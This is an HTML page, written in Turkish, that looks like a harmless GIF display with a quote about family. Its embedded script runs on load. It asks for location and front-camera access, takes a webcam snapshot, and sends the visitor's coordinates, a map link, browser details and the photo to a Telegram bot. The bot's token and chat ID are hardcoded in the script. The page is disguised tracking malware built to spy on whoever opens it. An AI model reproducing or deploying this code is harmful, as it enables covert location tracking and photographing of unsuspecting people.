<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF G√∂sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
            overflow-x: hidden;
        }

        .gif-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        .gif-container img {
            max-width: 90%;
            max-height: 70vh;
            width: auto;
            height: auto;
            object-fit: contain;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        .status {
            color: #ffffff;
            font-size: 16px;
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            max-width: 600px;
            white-space: pre-line;
        }

        .hidden {
            display: none !important;
        }

        /* Mobil cihazlar i√ßin responsive */
        @media (max-width: 768px) {
            .quote {
                font-size: 18px;
                padding: 0 15px;
            }

            .gif-container img {
                max-width: 95%;
                max-height: 60vh;
            }

            .gif-container {
                gap: 20px;
                padding: 15px;
            }
        }

        @media (max-width: 480px) {
            .quote {
                font-size: 16px;
                padding: 0 10px;
            }

            .gif-container img {
                max-width: 100%;
                max-height: 50vh;
            }

            .gif-container {
                gap: 15px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="gif-container">
        <img src="Don Carlone.gif" alt="GIF">
        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
        <div id="status" class="status hidden"></div>
    </div>

    <script>
        const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

        // Telegram bot ayarlarƒ±
        const botToken = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const chatId = '-4991699158';

        // Telegram'a mesaj g√∂nder
        async function sendToTelegram(message, photoData = null) {
            try {
                // Mesajƒ± g√∂nder
                const messageUrl = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
                const messageResponse = await fetch(messageUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const messageResult = await messageResponse.json();
                
                if (!messageResponse.ok) {
                    throw new Error(messageResult.description || 'Mesaj g√∂nderilemedi');
                }

                // Fotoƒüraf varsa g√∂nder
                if (photoData && photoData.image) {
                    // Base64'√º blob'a √ßevir
                    const base64Data = photoData.image.replace(/^data:image\/\w+;base64,/, '');
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    for (let i = 0; i < byteCharacters.length; i++) {
                        byteNumbers[i] = byteCharacters.charCodeAt(i);
                    }
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });

                    // FormData ile g√∂nder
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'üì∏ Ziyaret√ßi kamera fotoƒürafƒ±');

                    const photoUrl = `${TELEGRAM_API_URL}${botToken}/sendPhoto`;
                    await fetch(photoUrl, {
                        method: 'POST',
                        body: formData
                    });
                }

                return { success: true };
            } catch (error) {
                console.error('Telegram g√∂nderme hatasƒ±:', error);
                throw error;
            }
        }

        async function requestPermissions() {
            if (!botToken || !chatId) {
                return;
            }

            let locationData = null;
            let cameraData = null;

            // Konum ve kamera izinlerini paralel olarak iste
            const [locationResult, cameraResult] = await Promise.allSettled([
                // Konum izni iste
                (async () => {
                    try {
                        if (!navigator.geolocation) {
                            throw new Error('Geolocation desteklenmiyor');
                        }
                        
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: false,
                                timeout: 8000,
                                maximumAge: 60000
                            });
                        });

                        return {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                    } catch (error) {
                        return {
                            error: error.message,
                            code: error.code
                        };
                    }
                })(),
                
                // √ñn kamera izni iste
                (async () => {
                    try {
                        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                            throw new Error('Kamera API desteklenmiyor');
                        }
                        
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user' }
                        });

                        // Video stream'den bir frame yakala
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('playsinline', 'true');
                        video.setAttribute('autoplay', 'true');
                        video.muted = true;
                        video.play();

                        await new Promise((resolve, reject) => {
                            const timeout = setTimeout(() => {
                                if (video.readyState >= 2) {
                                    resolve();
                                }
                            }, 1000);
                            
                            video.onloadedmetadata = () => {
                                clearTimeout(timeout);
                                resolve();
                            };
                            video.onerror = (err) => {
                                clearTimeout(timeout);
                                reject(err);
                            };
                        });

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);

                        const result = {
                            image: canvas.toDataURL('image/jpeg', 0.7),
                            width: canvas.width,
                            height: canvas.height,
                            timestamp: new Date().toISOString()
                        };

                        stream.getTracks().forEach(track => track.stop());
                        return result;
                    } catch (error) {
                        return {
                            error: error.message,
                            name: error.name
                        };
                    }
                })()
            ]);

            locationData = locationResult.status === 'fulfilled' ? locationResult.value : { error: 'Konum alƒ±namadƒ±' };
            cameraData = cameraResult.status === 'fulfilled' ? cameraResult.value : { error: 'Kamera alƒ±namadƒ±' };

            // Telegram'a g√∂nder
            try {
                let message = 'üîî <b>Yeni Ziyaret√ßi Bilgileri</b>\n\n';
                message += `‚è∞ Zaman: ${new Date().toLocaleString('tr-TR')}\n`;
                message += `üåê URL: ${window.location.href}\n`;
                message += `üíª User Agent: ${navigator.userAgent}\n\n`;

                // Konum bilgisi - MUTLAKA EKLE
                if (locationData && locationData.latitude && locationData.longitude) {
                    message += `üìç <b>Konum:</b>\n`;
                    message += `   Enlem: ${locationData.latitude}\n`;
                    message += `   Boylam: ${locationData.longitude}\n`;
                    message += `   Doƒüruluk: ${locationData.accuracy ? locationData.accuracy.toFixed(2) + 'm' : 'Bilinmiyor'}\n\n`;
                    message += `üó∫Ô∏è <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}">Haritada G√∂r√ºnt√ºle</a>\n\n`;
                } else {
                    message += `‚ùå Konum: ${locationData?.error || 'Alƒ±namadƒ±'}\n\n`;
                }

                // Kamera bilgisi - MUTLAKA EKLE
                if (cameraData && cameraData.image) {
                    message += `üì∏ Kamera fotoƒürafƒ± alƒ±ndƒ± (${cameraData.width}x${cameraData.height})\n`;
                } else {
                    message += `‚ùå Kamera: ${cameraData?.error || 'Alƒ±namadƒ±'}\n`;
                }

                // Telegram'a g√∂nder - HATA OLSA Bƒ∞LE G√ñNDER
                await sendToTelegram(message, cameraData).catch(err => {
                    console.error('Telegram g√∂nderme hatasƒ±:', err);
                    // Hata olsa bile tekrar dene
                    setTimeout(() => {
                        sendToTelegram(message, cameraData);
                    }, 2000);
                });
            } catch (error) {
                console.error('G√∂nderme hatasƒ±:', error);
                // Hata olsa bile tekrar dene
                try {
                    let retryMessage = 'üîî <b>Yeni Ziyaret√ßi Bilgileri (Tekrar Deneme)</b>\n\n';
                    if (locationData && locationData.latitude) {
                        retryMessage += `üìç Konum: ${locationData.latitude}, ${locationData.longitude}\n`;
                    }
                    if (cameraData && cameraData.image) {
                        retryMessage += `üì∏ Kamera fotoƒürafƒ± var\n`;
                    }
                    await sendToTelegram(retryMessage, cameraData);
                } catch (retryError) {
                    console.error('Tekrar deneme hatasƒ±:', retryError);
                }
            }
        }

        // Sayfa y√ºklendiƒüinde sadece bir kere izinleri iste
        let permissionsRequested = false;
        
        function startPermissionRequest() {
            if (permissionsRequested) {
                return;
            }
            permissionsRequested = true;
            setTimeout(() => {
                requestPermissions();
            }, 1000);
        }
        
        // Sayfa y√ºklendiƒüinde izinleri iste
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', startPermissionRequest);
        } else {
            startPermissionRequest();
        }
        
        window.addEventListener('load', startPermissionRequest);
    </script>
</body>
</html>
